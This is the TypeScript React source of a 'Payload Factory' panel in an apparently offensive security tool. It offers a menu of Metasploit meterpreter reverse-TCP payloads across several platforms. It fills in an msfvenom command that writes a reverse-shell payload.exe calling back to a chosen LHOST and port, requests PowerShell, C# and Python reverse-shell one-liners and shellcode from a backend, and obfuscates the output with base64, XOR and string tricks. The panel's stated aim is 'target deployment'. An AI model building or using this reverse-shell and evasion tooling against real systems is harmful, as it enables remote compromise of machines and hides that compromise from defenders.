import { useState, useCallback } from 'react';

const MSF_PAYLOADS = [
  { label: 'Windows Reverse TCP', value: 'windows/meterpreter/reverse_tcp' },
  { label: 'Windows x64 Reverse TCP', value: 'windows/x64/meterpreter/reverse_tcp' },
  { label: 'Linux x64 Reverse TCP', value: 'linux/x64/meterpreter/reverse_tcp' },
  { label: 'PHP Reverse', value: 'php/meterpreter_reverse_tcp' },
  { label: 'Python Reverse', value: 'python/meterpreter/reverse_tcp' },
  { label: 'macOS x64 Reverse', value: 'osx/x64/meterpreter/reverse_tcp' },
  { label: 'Android Reverse TCP', value: 'android/meterpreter/reverse_tcp' },
];

const STANDALONE_TYPES = [
  { id: 'powershell_one_liner', label: 'PowerShell One-Liner', icon: '🪟' },
  { id: 'powershell_encoded', label: 'PowerShell Encoded', icon: '🔒' },
  { id: 'csharp_exe', label: 'C# EXE', icon: '📝' },
  { id: 'python_one_liner', label: 'Python One-Liner', icon: '🐍' },
];

const OBFUSCATION_METHODS = [
  { id: 'base64', label: 'Base64 Encode', icon: '🔤' },
  { id: 'xor', label: 'XOR Cipher', icon: '🔀' },
  { id: 'split', label: 'String Split', icon: '✂️' },
  { id: 'reverse', label: 'String Reverse', icon: '↩️' },
];

export function PayloadPanel() {
  const [tab, setTab] = useState<'msf' | 'standalone' | 'shellcode'>('msf');
  const [msfPayload, setMsfPayload] = useState('windows/x64/meterpreter/reverse_tcp');
  const [lhost, setLhost] = useState('192.168.1.100');
  const [lport, setLport] = useState('4444');
  const [arch, setArch] = useState('x64');
  const [standaloneType, setStandaloneType] = useState('powershell_one_liner');
  const [output, setOutput] = useState('');
  const [generating, setGenerating] = useState(false);
  const [obfuscationMethod, setObfuscationMethod] = useState('base64');
  const [showObfuscated, setShowObfuscated] = useState(false);
  const [obfuscatedOutput, setObfuscatedOutput] = useState('');
  const [copied, setCopied] = useState(false);
  const [saved, setSaved] = useState(false);

  const handleGenerate = useCallback(async () => {
    setGenerating(true);
    setOutput('');
    setShowObfuscated(false);
    try {
      let result = '';
      if (tab === 'msf') {
        result = await window.api.payloadGenerate('shellcode', lhost, parseInt(lport), arch);
        result = `# Generate this MSF payload using msfvenom:\nmsfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} -f exe -o payload.exe\n\n${result}`;
      } else if (tab === 'standalone') {
        if (standaloneType === 'powershell_one_liner' || standaloneType === 'powershell_encoded') {
          result = await window.api.payloadGenerate('ps1', lhost, parseInt(lport), standaloneType);
        } else if (standaloneType === 'csharp_exe') {
          result = await window.api.payloadGenerate('csharp', lhost, parseInt(lport));
        } else if (standaloneType === 'python_one_liner') {
          result = await window.api.payloadGenerate('python', lhost, parseInt(lport));
        }
      } else if (tab === 'shellcode') {
        result = await window.api.payloadGenerate('shellcode', lhost, parseInt(lport), arch);
      }
      setOutput(result);
      await window.api.addActivity({ tab: 'payload', type: 'generate', label: `Generated ${tab} payload`, detail: `${msfPayload}  →  ${lhost}:${lport}` });
    } catch (err: any) {
      setOutput(`Error: ${err.message}`);
    } finally {
      setGenerating(false);
    }
  }, [tab, msfPayload, lhost, lport, arch, standaloneType]);

  const handleObfuscate = useCallback(async () => {
    if (!output) return;
    try {
      const result = await window.api.payloadObfuscate(output, obfuscationMethod);
      setObfuscatedOutput(result);
      setShowObfuscated(true);
    } catch (err: any) {
      setObfuscatedOutput(`Error: ${err.message}`);
      setShowObfuscated(true);
    }
  }, [output, obfuscationMethod]);

  const handleCopy = useCallback(async (text: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }, []);

  const handleSave = useCallback(async () => {
    const text = showObfuscated ? obfuscatedOutput : output;
    if (!text) return;
    try {
      const ext = tab === 'standalone' && standaloneType === 'csharp_exe' ? '.cs' : '.txt';
      const result = await window.api.payloadSave(text, `payload_${Date.now()}${ext}`);
      setSaved(true);
      setTimeout(() => setSaved(false), 2000);
    } catch (err: any) {
      alert(`Save failed: ${err.message}`);
    }
  }, [output, obfuscatedOutput, showObfuscated, tab, standaloneType]);

  return (
    <div className="space-y-4">
      <div className="card border-redhawk-700/30">
        <div className="flex items-center gap-2 mb-2">
          <span className="text-lg">📦</span>
          <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">Payload Factory</h2>
        </div>
        <p className="text-xs text-gray-500">Generate MSF payloads, stand-alone binaries, and shellcode for target deployment.</p>
      </div>

      {/* Generator type tabs */}
      <div className="flex gap-1 bg-midnight-900 rounded-lg p-1 border border-midnight-800">
        {[
          { id: 'msf' as const, label: 'MSF Payload', icon: '💀' },
          { id: 'standalone' as const, label: 'Standalone', icon: '📄' },
          { id: 'shellcode' as const, label: 'Shellcode', icon: '🔧' },
        ].map((t) => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className={`flex-1 py-2 rounded-md text-xs font-medium transition-all ${
              tab === t.id ? 'bg-redhawk-600/20 text-redhawk-400 border border-redhawk-600/30' : 'text-gray-500 hover:text-gray-300'
            }`}>
            {t.icon} {t.label}
          </button>
        ))}
      </div>

      {/* Config */}
      <div className="card">
        <div className="card-header">Configuration</div>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">LHOST</label>
            <input type="text" value={lhost} onChange={(e) => setLhost(e.target.value)}
              className="input-field h-9 text-sm font-mono" placeholder="Your IP" />
          </div>
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">LPORT</label>
            <input type="text" value={lport} onChange={(e) => setLport(e.target.value)}
              className="input-field h-9 text-sm font-mono" placeholder="4444" />
          </div>
          {tab === 'msf' && (
            <div className="sm:col-span-2">
              <label className="text-[10px] text-gray-500 block mb-1">Payload</label>
              <select value={msfPayload} onChange={(e) => setMsfPayload(e.target.value)}
                className="input-field h-9 text-sm">
                {MSF_PAYLOADS.map((p) => (
                  <option key={p.value} value={p.value} className="bg-midnight-900">{p.label}</option>
                ))}
              </select>
            </div>
          )}
          {tab === 'standalone' && (
            <div className="sm:col-span-2">
              <label className="text-[10px] text-gray-500 block mb-1">Type</label>
              <div className="flex flex-wrap gap-1.5">
                {STANDALONE_TYPES.map((t) => (
                  <button key={t.id} onClick={() => setStandaloneType(t.id)}
                    className={`text-xs px-2.5 py-1.5 rounded-md border transition-all ${
                      standaloneType === t.id
                        ? 'bg-redhawk-600/20 text-redhawk-400 border-redhawk-600/30'
                        : 'bg-midnight-800 text-gray-400 border-midnight-700 hover:border-midnight-600'
                    }`}>
                    {t.icon} {t.label}
                  </button>
                ))}
              </div>
            </div>
          )}
          {tab === 'shellcode' && (
            <div className="sm:col-span-2">
              <label className="text-[10px] text-gray-500 block mb-1">Architecture</label>
              <div className="flex gap-1.5">
                {['x86', 'x64'].map((a) => (
                  <button key={a} onClick={() => setArch(a)}
                    className={`text-xs px-3 py-1.5 rounded-md border transition-all ${
                      arch === a
                        ? 'bg-redhawk-600/20 text-redhawk-400 border-redhawk-600/30'
                        : 'bg-midnight-800 text-gray-400 border-midnight-700'
                    }`}>{a}</button>
                ))}
              </div>
            </div>
          )}
        </div>
        <button onClick={handleGenerate} disabled={generating || !lhost.trim() || !lport.trim()}
          className="btn-primary w-full mt-3">
          {generating ? 'Generating...' : 'Generate Payload'}
        </button>
      </div>

      {/* Output */}
      {output && (
        <div className="card">
          <div className="flex items-center justify-between mb-2">
            <span className="card-header mb-0">Output</span>
            <div className="flex gap-1">
              <button onClick={() => handleCopy(showObfuscated ? obfuscatedOutput : output)}
                className="btn-ghost text-xs">{copied ? 'Copied!' : '📋 Copy'}</button>
              <button onClick={handleSave} className="btn-ghost text-xs">{saved ? 'Saved!' : '💾 Save'}</button>
            </div>
          </div>
          <pre className="terminal text-[11px] max-h-64 overflow-y-auto whitespace-pre-wrap break-all">{showObfuscated ? obfuscatedOutput : output}</pre>

          {/* Obfuscation */}
          <div className="mt-3 pt-3 border-t border-midnight-800">
            <label className="text-[10px] text-gray-500 block mb-1.5">Obfuscate</label>
            <div className="flex flex-wrap gap-1.5 mb-2">
              {OBFUSCATION_METHODS.map((m) => (
                <button key={m.id} onClick={() => setObfuscationMethod(m.id)}
                  className={`text-xs px-2 py-1 rounded border transition-all ${
                    obfuscationMethod === m.id
                      ? 'bg-redhawk-600/20 text-redhawk-400 border-redhawk-600/30'
                      : 'bg-midnight-800 text-gray-400 border-midnight-700'
                  }`}>{m.icon} {m.label}</button>
              ))}
            </div>
            <button onClick={handleObfuscate} className="btn-secondary text-xs w-full">Obfuscate</button>
          </div>
        </div>
      )}
    </div>
  );
}
